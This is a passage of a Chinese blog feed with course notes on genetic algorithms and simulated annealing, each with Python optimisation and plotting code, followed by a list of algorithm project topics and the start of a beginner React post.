title="遗传算法实现"></a>遗传算法实现</h5><p>种群初始化：通过随机生成的方式来创造一个种群，采用二进制将一个染色体编码为基因型，随后用进制转化，将二进制的基因型转化为十进制的表现型。</p><p>适应度计算（种群评估）：将目标函数值作为个体的适应度。</p><p>选择（复制）操作：根据种群中个体的适应度大小，通过轮盘赌等方式将适应度高的个体从当前种群中选择出来。其中轮盘赌即是与适应度成正比的概率来确定各个个体遗传到下一代群体中的数量。具体步骤如下：</p><ul><li>首先计算所有个体的适应度总和$\sum f_i$</li><li>其次计算出每个个体的相对适应度大小$\frac {f_i} {\sum_{f_i}}$</li><li>再产生一个0到1之间的随机数，依据随机数出现在上述哪个概率区域来确定各个个体被选中的次数</li></ul><p>交叉（交配）运算：该步骤是遗传算法中产生新的个体的主要操作过程，它用一定的交配概率阈值(pc，一般是0.4到0.99)来控制是否采取单点交叉，多点交叉等方式生成新的交叉个体。具体步骤如下：</p><ul><li>先对群体随机配对</li><li>再随机设定交叉点的位置</li><li>再互换配对染色体间的部分基因</li></ul><p>变异运算：该步骤是产生新的个体的另一种操作。一般先随机产生变异点，再根据变异概率阈值(pm，一般是0.0001到0.1)将变异点原有基因取反</p><p>终止判断：如果满足条件（迭代次数，一般是200~500）则终止算法，否则返回适应度计算</p><p><strong>代码实现</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> cm<br><span class="hljs-keyword">from</span> mpl_toolkits.mplot3d <span class="hljs-keyword">import</span> Axes3D<br><br><span class="hljs-comment"># sample:计算F(x,y)在[-3,3]和[-3,3]里的最大值</span><br><br><span class="hljs-comment"># 初始化</span><br>DNA_SIZE = <span class="hljs-number">24</span><br>POP_SIZE = <span class="hljs-number">200</span><br>CROSSOVER_RATE = <span class="hljs-number">0.8</span><br>MUTATION_RATE = <span class="hljs-number">0.005</span><br>N_GENERATIONS = <span class="hljs-number">50</span><br>X_BOUND = [-<span class="hljs-number">3</span>,<span class="hljs-number">3</span>]<br>Y_BOUND = [-<span class="hljs-number">3</span>,<span class="hljs-number">3</span>]<br><br><span class="hljs-comment"># 目标函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">F</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>*(<span class="hljs-number">1</span>-x)**<span class="hljs-number">2</span>*np.exp(-(x**<span class="hljs-number">2</span>)-(y+<span class="hljs-number">1</span>)**<span class="hljs-number">2</span>)-<span class="hljs-number">10</span>*(x/<span class="hljs-number">5</span>- x**<span class="hljs-number">3</span> - y**<span class="hljs-number">5</span>)*np.exp(-x**<span class="hljs-number">2</span>-y**<span class="hljs-number">2</span>)-<span class="hljs-number">1</span>/<span class="hljs-number">3</span>**np.exp(-(x+<span class="hljs-number">1</span>)**<span class="hljs-number">2</span> - y**<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># 适应度函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_fitness</span>(<span class="hljs-params">pop</span>):<br>    x,y = translateDNA(pop)<br>    pred = F(x,y)<br>    <span class="hljs-keyword">return</span> (pred - np.<span class="hljs-built_in">min</span>(pred)) + <span class="hljs-number">1e-3</span><br><br><span class="hljs-comment"># 解码函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">translateDNA</span>(<span class="hljs-params">pop</span>):<br>    x_pop = pop[:,<span class="hljs-number">1</span>::<span class="hljs-number">2</span>] <span class="hljs-comment"># 奇数列</span><br>    y_pop = pop[:,::<span class="hljs-number">2</span>] <span class="hljs-comment"># 偶数列</span><br>    x = x_pop.dot(<span class="hljs-number">2</span>**np.arange(DNA_SIZE)[::-<span class="hljs-number">1</span>])/<span class="hljs-built_in">float</span>(<span class="hljs-number">2</span>**DNA_SIZE-<span class="hljs-number">1</span>)*(X_BOUND[<span class="hljs-number">1</span>]-X_BOUND[<span class="hljs-number">0</span>])+X_BOUND[<span class="hljs-number">0</span>]<br>    y = y_pop.dot(<span class="hljs-number">2</span>**np.arange(DNA_SIZE)[::-<span class="hljs-number">1</span>])/<span class="hljs-built_in">float</span>(<span class="hljs-number">2</span>**DNA_SIZE-<span class="hljs-number">1</span>)*(Y_BOUND[<span class="hljs-number">1</span>]-Y_BOUND[<span class="hljs-number">0</span>])+Y_BOUND[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> x,y<br><br><span class="hljs-comment"># 交叉变异</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crossover_and_mutation</span>(<span class="hljs-params">pop,CROSSOVER_RATE = <span class="hljs-number">0.8</span></span>):<br>    new_pop = []<br>    <span class="hljs-keyword">for</span> father <span class="hljs-keyword">in</span> pop:<br>        child = father<br>        <span class="hljs-keyword">if</span> np.random.rand() &lt; CROSSOVER_RATE:<br>            mother = pop[np.random.randint(POP_SIZE)]<br>            cross_points = np.random.randint(low=<span class="hljs-number">1</span>,high=DNA_SIZE*<span class="hljs-number">2</span>)<br>            child[cross_points:] = mother[cross_points:]<br>        mutation(child)<br>        new_pop.append(child)<br>    <span class="hljs-keyword">return</span> new_pop<br><br><span class="hljs-comment"># 变异</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mutation</span>(<span class="hljs-params">child,MUTATION_RATE=<span class="hljs-number">0.001</span></span>):<br>    <span class="hljs-keyword">if</span> np.random.rand() &lt; MUTATION_RATE:<br>        mutate_point = np.random.randint(<span class="hljs-number">0</span>,DNA_SIZE*<span class="hljs-number">2</span>)<br>        child[mutate_point] = child[mutate_point]^<span class="hljs-number">1</span><br><br><span class="hljs-comment"># 选择</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">select</span>(<span class="hljs-params">pop, fitness</span>):<br>    idx = np.random.choice(np.arange(POP_SIZE),size=POP_SIZE,replace=<span class="hljs-literal">True</span>,p=(fitness)/(fitness.<span class="hljs-built_in">sum</span>()))<br>    <span class="hljs-keyword">return</span> pop[idx]<br><br><span class="hljs-comment"># 打印结果</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_info</span>(<span class="hljs-params">pop</span>):<br>    fitness = get_fitness(pop)<br>    max_fitness_index = np.argmax(fitness)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;max_fitness:&quot;</span>,fitness[max_fitness_index])<br>    x,y = translateDNA(pop)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;最优的基因型：&quot;</span>,pop[max_fitness_index])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;(x,y):&quot;</span>,(x[max_fitness_index],y[max_fitness_index]))<br><br><span class="hljs-comment"># 可视化</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">plot_3d</span>(<span class="hljs-params">ax</span>):<br><br>    X = np.linspace(*X_BOUND, <span class="hljs-number">100</span>)<br>    Y = np.linspace(*Y_BOUND, <span class="hljs-number">100</span>)<br>    X,Y = np.meshgrid(X,Y)<br>    Z = F(X,Y)<br>    ax.plot_surface(X,Y,Z,rstride=<span class="hljs-number">1</span>,cstride=<span class="hljs-number">1</span>,cmap=cm.coolwarm)<br>    ax.set_zlim(-<span class="hljs-number">10</span>,<span class="hljs-number">10</span>)<br>    ax.set_xlabel(<span class="hljs-string">&#x27;x&#x27;</span>)<br>    ax.set_ylabel(<span class="hljs-string">&#x27;y&#x27;</span>)<br>    ax.set_zlabel(<span class="hljs-string">&#x27;z&#x27;</span>)<br>    plt.pause(<span class="hljs-number">3</span>)<br>    plt.show()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GAs</span>():<br><br>    fig = plt.figure()<br>    ax = Axes3D(fig)<br>    plt.ion()<br>    plot_3d(ax)<br><br>    <span class="hljs-comment"># 随机产生初始种群</span><br>    pop = np.random.randint(<span class="hljs-number">2</span>,size=(POP_SIZE,DNA_SIZE*<span class="hljs-number">2</span>))<br><br>    <span class="hljs-comment"># 迭代N代</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N_GENERATIONS):<br>        x,y = translateDNA(pop)<br><br>        <span class="hljs-comment"># 可视化</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;sca&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">locals</span>():<br>            sca.remove()<br>        sca = ax.scatter(x,y,F(x,y),c=<span class="hljs-string">&#x27;black&#x27;</span>,marker=<span class="hljs-string">&#x27;o&#x27;</span>);plt.show();plt.pause(<span class="hljs-number">0.1</span>)<br><br>        pop = np.array(crossover_and_mutation(pop,CROSSOVER_RATE))<br>        fitness = get_fitness(pop)<br>        pop = select(pop,fitness)<br><br>    print_info(pop)<br>    plt.ioff()<br>    plot_3d(ax)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    GAs()<br></code></pre></td></tr></table></figure><h4 id="模拟退火算法"><a href="#模拟退火算法" class="headerlink" title="模拟退火算法"></a>模拟退火算法</h4><ul><li>模拟退火算法采用Monte Carlo方法，模仿金属退火时的加热-冷却过程来求解最大规模组合优化问题</li><li>与遗传算法相似，采用随机方式探索解空间，可用于非连续、不可微、非凸问题</li><li>与遗传算法不同，模拟退火在理论上具有可以保证的收敛性</li><li>遗传算法种群中的每一个点具有独立性，可以并行执行；模拟退火算法从单点出发，在存在很多局部最优解的情况下可以跳出局部寻找全局最优</li></ul><p> <strong>退火</strong></p><ul><li><p>固体材料加热到超过熔点，然后冷却回固体状态</p></li><li><p>最终的结构取决于冷却的方式</p><ul><li>缓慢冷却–大晶体（能量低）</li><li>快速冷却–缺陷（能量高）</li></ul></li><li><p>Metropolis算法模拟系统在冷却过程中能量变化，系统会最终收敛到某种能量的“冻结”状态</p></li><li><p>根据热力学：在温度T时，能量增加$\delta E$的概率为：$P(\triangle E) &#x3D; e^{-\frac {\delta E} {kT}}$</p></li></ul><p><strong>模拟退火算法实施</strong></p><ul><li>与一般的爬山法相似，区别在于不是接受最佳移动，而是接受一个随机移动</li><li>如果移动改进了结果，则接受；否则算法以一个小于1的概率采取这种移动（Metropolis判据）</li><li>接受概率与移动使解变坏的程度$\triangle E$有关，与其指数成反比：$Pr(\text{accepting uphill move}) \sim 1-e^{\frac {\triangle E} {kT}}$</li><li>参数T表示退火时的温度，T越大，接受的概率越大；k实质是Boltzmann常数。选择参数T逐步下降，$T(k+1)&#x3D;\alpha T(k), \alpha &lt; 1$</li></ul><p><strong>退火过程</strong></p><ul><li>凝聚态物理中，固体液化时在加热后需要冷却，使粒子在低能量状态下重新组织为晶格形式</li><li>在寻优过程中，允许偶发的上升，逃脱局部最优的陷阱</li></ul><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/2022-05-07_163131.png" alt="2022-05-07_163131"></p><p><strong>模拟退火过程</strong></p><ul><li>设置初始温度</li><li>重复下列步骤<ol><li>按预定次数执行<ul><li>生成一个扰动</li><li>如果能量下降，接受新的状态；否则以$P(\triangle E)$接受新的概率状态</li><li>降低温度</li></ul></li><li>直到冻结</li></ol></li></ul><p><strong>分析</strong></p><ul><li>在高温下，接受更差步骤的概率更改。如果$T&#x3D;\infin$，所有动作均可接受，对应于随机局部行走</li><li>在低温下，接受更差步骤的概率降低。如果$T&#x3D;0$，不接受更差的移动，搜索等同于局部搜索</li><li>接受解的质量大幅度退化的概率呈指数下降，趋近于0</li><li>温度必须足够高才允许移动到几乎所有邻近状态</li></ul><p><strong>分析</strong></p><ul><li>平稳分布（玻尔兹曼）：$P(x) ∝ e^{\frac {E(x)} T}$</li><li>如果T下降的足够慢，就会收敛到最优状态</li><li>考虑两个相邻状态x,y，$E(y) &lt; E(x)$</li><li>假设x→y和y→x且出度D(x)&#x3D;D(y)&#x3D;D</li><li>设P(x),P(y)为T点的均衡占有概率，P(x→y)是状态x跃迁到状态y的概率</li><li>为了避开局部最优，需要的爬坡步数越多，越不可能连续爬坡</li><li>“足够慢”也许意味着指数级的慢</li></ul><h5 id="模拟退火实现"><a href="#模拟退火实现" class="headerlink" title="模拟退火实现"></a>模拟退火实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> matplotlib.animation <span class="hljs-keyword">as</span> animation<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> mpl_toolkits.mplot3d <span class="hljs-keyword">import</span> Axes3D<br><br><span class="hljs-comment"># sample: 求解一元函数y=x+10sin(5x)+7cos(4x)的最大值</span><br><br><span class="hljs-comment"># 判断函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Judge</span>(<span class="hljs-params">deltaE,T</span>):<br>    <span class="hljs-keyword">if</span> deltaE &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># probability会变大</span><br>        probability = math.exp(deltaE/T)<br>        <span class="hljs-comment"># random.random() 用于生成一个0到1的随机浮点数</span><br>        <span class="hljs-keyword">if</span> probability &gt; random.random():<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 为当前解添加随机扰动</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Disturbance</span>(<span class="hljs-params">low,high,x_old</span>):<br>    <span class="hljs-keyword">if</span> random.random() &gt; <span class="hljs-number">0.5</span>:<br>        x_new = x_old + (high-x_old)*random.random()<br>    <span class="hljs-keyword">else</span>:<br>        x_new = x_old - (x_old-low)*random.random()<br>    <span class="hljs-keyword">return</span> x_new<br><br><span class="hljs-comment"># 优化目标函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Func</span>(<span class="hljs-params">x</span>):<br>    y = x+<span class="hljs-number">10</span>*math.sin(<span class="hljs-number">5</span>*x)+<span class="hljs-number">7</span>*math.cos(<span class="hljs-number">4</span>*x)<br>    <span class="hljs-keyword">return</span> y<br><br><span class="hljs-comment"># 退火过程</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SA</span>(<span class="hljs-params">low,high,T,T_min,alpha,counter</span>):<br>    c = <span class="hljs-number">0</span><br>    x_old = low+(high-low)*random.random()<br>    x_new = x_old<br>    value_old = Func(x_old)<br>    value_new = Func(x_new)<br>    record_x = []<br>    record_y = []<br>    <span class="hljs-keyword">while</span> T &gt; T_min <span class="hljs-keyword">and</span> c &lt; counter:<br>        x_new = Disturbance(low, high, x_old)<br>        value_new = Func(x_new)<br>        deltaE = value_new - value_old<br>        <span class="hljs-comment"># 求最大值：deltaE&gt;0更优 deltaE&lt;0更劣 </span><br>        <span class="hljs-keyword">if</span> Judge(deltaE,T) == <span class="hljs-number">1</span>:<br>            value_old = value_new<br>            record_x.append(x_new)<br>            record_y.append(value_new)<br>            x_old = x_new<br>        <span class="hljs-keyword">if</span> deltaE &gt; <span class="hljs-number">0</span>:<br>            T = T*alpha<br>        <span class="hljs-keyword">else</span>:<br>            counter += <span class="hljs-number">1</span><br>    <br>    <span class="hljs-comment"># 可视化</span><br>    <span class="hljs-comment"># 第一个图：显示x,y各自的取值</span><br>    length = <span class="hljs-built_in">len</span>(record_x)<br>    index = [i+<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)]<br>    plt.plot(index,record_y)<br>    plt.plot(index,record_x)<br>    <br>    <span class="hljs-comment"># 第二个图：显示x,y曲线</span><br>    x = np.linspace(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">10000</span>)<br>    y = x+<span class="hljs-number">10</span>*np.sin(<span class="hljs-number">5</span>*x)+<span class="hljs-number">7</span>*np.cos(<span class="hljs-number">4</span>*x)<br>    plt.plot(x,y)<br><br>    <span class="hljs-comment"># 绘制动画</span><br>    fig, ax = plt.subplots()<br>    l = ax.plot(x,y)<br>    dot, = ax.plot([],[],<span class="hljs-string">&#x27;ro&#x27;</span>)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>():<br>        ax.set_xlim(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>)<br>        ax.set_ylim(-<span class="hljs-number">16</span>,<span class="hljs-number">25</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_dot</span>():<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> index:<br>            newdot = [record_x[i-<span class="hljs-number">1</span>],record_y[i-<span class="hljs-number">1</span>]]<br>            <span class="hljs-keyword">yield</span> newdot<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_dot</span>(<span class="hljs-params">newd</span>):<br>        dot.set_data(newd[<span class="hljs-number">0</span>],newd[<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">return</span> dot,<br><br>    ani = animation.FuncAnimation(<br>        fig, update_dot, frames = gen_dot, repeat = <span class="hljs-literal">False</span>, <br>        interval = <span class="hljs-number">10</span>, init_func = init)<br><br>    plt.show()<br><br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    SA(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1e5</span>,<span class="hljs-number">1e-3</span>,<span class="hljs-number">0.98</span>,<span class="hljs-number">1000</span>)<br></code></pre></td></tr></table></figure><p><strong>练习</strong></p><ul><li>函数形式：$f(x)&#x3D;x^3-60x^2+900x+100$</li><li>编码x：5位二进制整数</li><li>邻域：随机反转某一位的值</li><li>初始值：$x_0&#x3D;0x10101,T_0&#x3D;800$</li><li>冷却方案：$T_k&#x3D;0.9T_{k-1}$</li></ul><h3 id="10、分治算法回顾-x2F-矩阵运算-x2F-流算法-x2F-在线算法"><a href="#10、分治算法回顾-x2F-矩阵运算-x2F-流算法-x2F-在线算法" class="headerlink" title="10、分治算法回顾&#x2F;矩阵运算&#x2F;流算法&#x2F;在线算法"></a>10、分治算法回顾&#x2F;矩阵运算&#x2F;流算法&#x2F;在线算法</h3><h4 id="大作业"><a href="#大作业" class="headerlink" title="大作业"></a>大作业</h4><p>8min PPT：问题的定义、算法、分析、实现及举例</p><p> 时间空间复杂度 不足及改进的思路</p><p>周六实验课演示</p><p>可选主题：寻找最近邻点问题、寻找凸包问题、最长公共子序列问题、最优二叉搜索树、人员分配问题、旅行商问题(TSP)、A*算法、素数检验问题、子集和问题近似求解、顶点覆盖问题</p><h4 id="分治算法回顾"><a href="#分治算法回顾" class="headerlink" title="分治算法回顾"></a>分治算法回顾</h4><p>矩阵运算</p><h5 id="Strassen算法"><a href="#Strassen算法" class="headerlink" title="Strassen算法"></a>Strassen算法</h5><h4 id="流算法"><a href="#流算法" class="headerlink" title="流算法"></a>流算法</h4><h3 id="11、"><a href="#11、" class="headerlink" title="11、"></a>11、</h3><h3 id="12、实验课（pre）"><a href="#12、实验课（pre）" class="headerlink" title="12、实验课（pre）"></a>12、实验课（pre）</h3><h4 id="x3D-x3D-寻找最近邻点问题-x3D-x3D"><a href="#x3D-x3D-寻找最近邻点问题-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;寻找最近邻点问题&#x3D;&#x3D;"></a>&#x3D;&#x3D;寻找最近邻点问题&#x3D;&#x3D;</h4><h4 id="x3D-x3D-寻找凸包问题-x3D-x3D"><a href="#x3D-x3D-寻找凸包问题-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;寻找凸包问题&#x3D;&#x3D;"></a>&#x3D;&#x3D;寻找凸包问题&#x3D;&#x3D;</h4><h4 id="x3D-x3D-最长公共子序列问题-x3D-x3D"><a href="#x3D-x3D-最长公共子序列问题-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;最长公共子序列问题&#x3D;&#x3D;"></a>&#x3D;&#x3D;最长公共子序列问题&#x3D;&#x3D;</h4><h4 id="x3D-x3D-最优二叉搜索树-x3D-x3D"><a href="#x3D-x3D-最优二叉搜索树-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;最优二叉搜索树&#x3D;&#x3D;"></a>&#x3D;&#x3D;最优二叉搜索树&#x3D;&#x3D;</h4><h4 id="x3D-x3D-人员分配问题-x3D-x3D"><a href="#x3D-x3D-人员分配问题-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;人员分配问题&#x3D;&#x3D;"></a>&#x3D;&#x3D;人员分配问题&#x3D;&#x3D;</h4><h4 id="x3D-x3D-旅行商问题（TSP）-x3D-x3D"><a href="#x3D-x3D-旅行商问题（TSP）-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;旅行商问题（TSP）&#x3D;&#x3D;"></a>&#x3D;&#x3D;旅行商问题（TSP）&#x3D;&#x3D;</h4><h4 id="x3D-x3D-A-算法-x3D-x3D"><a href="#x3D-x3D-A-算法-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;A*算法&#x3D;&#x3D;"></a>&#x3D;&#x3D;A*算法&#x3D;&#x3D;</h4><h4 id="x3D-x3D-素数检验问题-x3D-x3D"><a href="#x3D-x3D-素数检验问题-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;素数检验问题&#x3D;&#x3D;"></a>&#x3D;&#x3D;素数检验问题&#x3D;&#x3D;</h4><h4 id="x3D-x3D-子集和问题近似求解-x3D-x3D"><a href="#x3D-x3D-子集和问题近似求解-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;子集和问题近似求解&#x3D;&#x3D;"></a>&#x3D;&#x3D;子集和问题近似求解&#x3D;&#x3D;</h4><h4 id="x3D-x3D-顶点覆盖问题-x3D-x3D"><a href="#x3D-x3D-顶点覆盖问题-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;顶点覆盖问题&#x3D;&#x3D;"></a>&#x3D;&#x3D;顶点覆盖问题&#x3D;&#x3D;</h4>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>动态规划</tag>
      
      <tag>随机化算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>react</title>
    <link href="/blog/2022/08/12/react/"/>
    <url>/blog/2022/08/12/react/</url>
    
    <content type="html"><![CDATA[<h1 id="react"><a href="#react" class="headerlink" title="react"></a>react</h1><p>常看常新</p><h3 id="1-npx可以不用管node版本的限制，先下载，之后删掉，不占电脑空间"><a href="#1-npx可以不用管node版本的限制，先下载，之后删掉，不占电脑空间" class="headerlink" title="1. npx可以不用管node版本的限制，先下载，之后删掉，不占电脑空间"></a>1. npx可以不用管node版本的限制，先下载，之后删掉，不占电脑空间</h3><p>快速新建一个react项目：<code>npx create-react-app demo</code></p><h3 id="2-组件名称要大写"><a href="#2-组件名称要大写" class="headerlink" title="2. 组件名称要大写"></a>2. 组件名称要大写</h3><h3 id="3-最简易的react实例"><a href="#3-最简易的react实例" class="headerlink" title="3. 最简易的react实例"></a>3. 最简易的react实例</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, world!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>);<br></code></pre></td></tr></table></figure><p>开始进行提取：对值和方法</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">formatName</span>(<span class="hljs-params">user</span>) &#123;<br>  <span class="hljs-keyword">return</span> user.<span class="hljs-property">firstName</span> + <span class="hljs-string">&#x27; &#x27;</span> + user.<span class="hljs-property">lastName</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> user = &#123;<br>  <span class="hljs-attr">firstName</span>: <span class="hljs-string">&#x27;Harper&#x27;</span>,<br>  <span class="hljs-attr">lastName</span>: <span class="hljs-string">&#x27;Perez&#x27;</span><br>&#125;;<br><br><span 